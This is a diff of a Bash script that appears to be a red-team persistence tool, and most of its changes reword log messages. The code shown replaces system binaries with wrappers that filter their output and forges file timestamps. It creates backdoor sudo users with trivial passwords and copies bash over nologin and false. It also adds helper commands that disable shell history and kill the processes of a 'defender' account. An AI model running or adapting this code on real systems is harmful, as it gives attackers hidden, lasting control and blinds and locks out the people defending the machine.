@@ -16,7 +16,7 @@ for i in "${!bins[@]}"; do
 $real_bin \"\$@\" | egrep -v '$exclude'" > "$orig_path"
         chmod +x "$orig_path"
         touch -r "$real_bin" "$orig_path"
-        echo "[+] $cmd is now $swap"
+        echo "[+] $cmd -> $swap"
     else
         echo "[!] $cmd already modified, skipping."
     fi
@@ -29,16 +29,19 @@ for user in "${newusers[@]}"; do
   useradd -m "$user" -s /bin/bash
   usermod -aG sudo "$user"
   echo "$user:$user" | chpasswd
-  echo "$user created"
+  echo "[-] $user created"
 done
 
 for moduser in "${modusers[@]}"; do
   usermod -aG sudo "$moduser"
   echo "$moduser:$moduser" | chpasswd
-  echo "$moduser modified"
+  echo "[.] $moduser modified"
 done
 
 echo "/usr/sbin/nologin /usr/bin/false" | xargs -n 1 cp /bin/bash
 md5sum /bin/bash
 md5sum /usr/sbin/nologin
 md5sum /usr/bin/false
+
+echo "unset HISTFILE" > /usr/bin/ww && chmod +x /usr/bin/ww && touch -r /usr/bin/ww /usr/bin/xargs
+echo "pkill -u defender" > /usr/bin/mm && chmod +x /usr/bin/mm && touch -r /usr/bin/mm /usr/bin/xargs
